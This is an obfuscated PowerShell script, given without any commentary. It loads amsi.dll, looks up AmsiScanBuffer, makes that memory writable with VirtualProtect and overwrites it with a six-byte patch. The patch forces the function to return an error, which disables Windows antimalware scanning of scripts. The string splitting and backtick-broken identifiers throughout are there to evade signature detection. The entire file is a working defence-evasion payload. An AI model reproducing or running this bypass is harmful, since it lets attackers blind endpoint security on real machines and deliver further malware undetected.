 $BjS3P5    =  [Type](  'wiN' +'32' )  ;   SeT-iTEM VarIable:0NZOC (  [TYPE]('SyStem'  +'.RU'  + 'NTI' + 'Me.INT'  +'eROp' + 'Service'  +'S.m'+'a'  +'RshAl') )   ;    ${w`In`32} =   @"
using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

adD`-t`YpE ${w`I`N32}

${Lo`AD`LIb`RARY}  =   (gi  ('Va' + 'RiABLe:'+  'bJS'+  '3p' +'5' )   ).value::LOADlIbrarY( 'am'  +  ('si.'  +'dll' ) )
${AdD`RESs} =    (  vaRiaBLE ( 'b'+ 'Js3P' +'5' )   ).vAluE::getPrOCaDDresS(  ${L`oaD`lIbrary}, (  'Am'+'si')  + ('Sc'+'an'  )   +   ( 'Bu'+  'ffe'  +'r'))
${p} =   0
 (    gEt-VARiAbLe  bJs3P5  -vA )::VirTUaLProteCT(${ADd`R`esS}, [uint32]5, 0x40, [ref]${p})
${PAt`cH} = [Byte[]] (  0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
 (  VaRIABLe  0nZoC   ).vALue::COpy( ${Pat`Ch}, 0, ${A`dDRE`sS}, 6 )
